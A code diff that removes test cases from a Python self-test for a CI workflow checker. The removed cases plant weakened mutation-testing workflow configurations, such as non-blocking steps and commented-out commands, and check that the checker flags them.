-                               "          exit 0\n"),
-         "mutation aggregate shard-failure gate does not exit non-zero"),
-        ("a concurrency group shared by every head",
-         sweep_replacement(
-             "  group: mutation-proof-${{ github.event.pull_request.number || github.run_id }}\n",
-             "  group: mutation-proof\n"),
-         "mutation workflow concurrency"),
-        ("push runs of one head sharing a group a later run can replace",
-         sweep_replacement(
-             "  group: mutation-proof-${{ github.event.pull_request.number || github.run_id }}\n",
-             "  group: mutation-proof-${{ github.event.pull_request.number || github.sha }}\n"),
-         "mutation workflow concurrency"),
-        ("a sweep that cancels pushes to main",
-         sweep_replacement(
-             "  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n",
-             "  cancel-in-progress: true\n"),
-         "mutation workflow concurrency"),
-        ("a narrowed fragment download",
-         sweep_replacement("          pattern: mutation-fragment-*\n",
-                           "          pattern: mutation-fragment-0*\n"),
-         "mutation aggregate fragment download"),
-        ("a non-blocking policy enforcement step",
-         sweep_replacement(
-             "      - name: reject incomplete evidence and enforce the mutation policy\n"
-             "        run: >-\n",
-             "      - name: reject incomplete evidence and enforce the mutation policy\n"
-             "        continue-on-error: true\n        run: >-\n"),
-         "mutation aggregate comparison step fields"),
-        ("a policy enforcement over one named fragment",
-         sweep_replacement("          --aggregate mutation-fragments/*.json\n",
-                           "          --aggregate mutation-fragments/one.json\n"),
-         "mutation aggregate policy command"),
-        # YAML recognises no comment inside a block scalar, so a `#` line in a FOLDED
-        # command is content: folding joins it and the shell comments out the whole line.
-        # Dropping those lines the way a literal `run: |` block allows turned the sweep's
-        # aggregate into a no-op that exits zero, with this oracle reading the
-        # command it expected.
-        ("a comment line folded into the aggregate command",
-         sweep_replacement("          python3 tools/write-mutation-receipt.py\n"
-                           "          --aggregate mutation-fragments/*.json\n",
-                           "          # measurement disabled\n"
-                           "          python3 tools/write-mutation-receipt.py\n"
-                           "          --aggregate mutation-fragments/*.json\n"),
-         "mutation aggregate policy command"),
-        ("a comment line folded into the shard command",
-         sweep_replacement(
-             "          --expected-head '${{ github.event.pull_request.head.sha "
-             "|| github.sha }}'\n",
-             "          # --expected-head '${{ github.event.pull_request.head.sha "
-             "|| github.sha }}'\n"),
-         "mutation shard receipt command"),
-    ):
-        expect(
-            f"coordinated sweep bytes cannot hide {label}",
-            coordinated_sweep_mutation(mutated, diagnosis),
-        )
     expect(
         "workflow source-bound bootstrap removal fails",
         workflow_error(EXPECTED_WORKFLOW.replace(
@@ -5370,16 +4682,6 @@ def selftest() -> int:
         )
     finally:
         globals()["publication_workflow_error"] = original_publication_workflow
-    original_mutation_authority = mutation_workflow_authority_error
-    globals()["mutation_workflow_authority_error"] = (
-        lambda _data: "planted mutation-workflow authority failure")
-    try:
-        expect(
-            "production gate adopts the independent mutation workflow authority result",
-            gate(fake_runner, emit_child_output=False) != 0,
-        )
-    finally:
-        globals()["mutation_workflow_authority_error"] = original_mutation_authority
     # Both new checks were wired into gate() without a plant, so deleting the call or the
     # append left the suite green while the gate printed FAIL and exited 0.
     original_workspace_doctrine = workspace_doctrine_error
